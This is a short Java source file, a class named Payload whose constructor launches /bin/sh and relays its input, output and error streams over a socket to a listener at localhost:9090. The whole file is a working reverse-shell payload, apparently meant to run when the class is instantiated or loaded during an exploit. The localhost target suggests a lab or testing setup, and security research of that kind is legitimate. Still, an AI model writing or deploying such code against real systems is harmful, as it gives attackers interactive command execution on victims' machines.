
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Payload {
    public Payload() throws Exception {
        String host="localhost";
        int port=9090;
        String shell="/bin/sh";
        Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
        Socket socket = new Socket(host, port);
        InputStream processInput = process.getInputStream(), processError = process.getErrorStream(), socketInput = socket.getInputStream();
        OutputStream processOutput = process.getOutputStream(), socketOutput = socket.getOutputStream();
        while (!socket.isClosed()) {
            while (processInput.available() > 0) socketOutput.write(processInput.read());
            while (processError.available() > 0) socketOutput.write(processError.read());
            while (socketInput.available() > 0) processOutput.write(socketInput.read());
            socketOutput.flush();
            processOutput.flush();
            Thread.sleep(50);
            try {
                process.exitValue();
                break;
            } catch (Exception e) {}
        }
        process.destroy();
        socket.close();
    }
}
